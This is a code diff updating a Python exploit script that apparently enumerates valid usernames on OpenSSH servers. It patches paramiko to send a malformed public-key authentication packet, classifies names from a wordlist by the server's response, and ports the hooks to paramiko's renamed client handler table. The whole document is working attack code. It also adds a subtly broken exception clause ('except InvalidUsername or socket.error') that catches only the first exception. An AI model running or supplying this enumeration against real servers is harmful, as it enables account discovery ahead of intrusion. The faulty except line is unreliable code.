@@ -26,9 +26,7 @@ class InvalidUsername(Exception):
 def add_boolean(*args, **kwargs):
     pass
 
-
-old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
-        paramiko.common.MSG_SERVICE_ACCEPT]
+old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 def service_accept(*args, **kwargs):
     paramiko.message.Message.add_boolean = add_boolean
@@ -55,14 +53,14 @@ def _paramiko_tunnel(username, *args, **kwargs):
         return
     try:
         transport.auth_publickey(us, paramiko.RSAKey.generate(2048))
-    except InvalidUsername:
+    except InvalidUsername or socket.error:
         print ('[*] {} - Invalid username'.format(us))
     except paramiko.ssh_exception.AuthenticationException:
         print ('[+] {} - Valid username'.format(us))
         return
 
 
-paramiko.auth_handler.AuthHandler._handler_table.update({
+paramiko.auth_handler.AuthHandler._client_handler_table.update({
     paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
     paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
 })
@@ -81,7 +79,3 @@ if args.wordlist is not None:
         for u in f:
             usernames.append(u)
         pool.map(_paramiko_tunnel, usernames)
-
-        
-
-
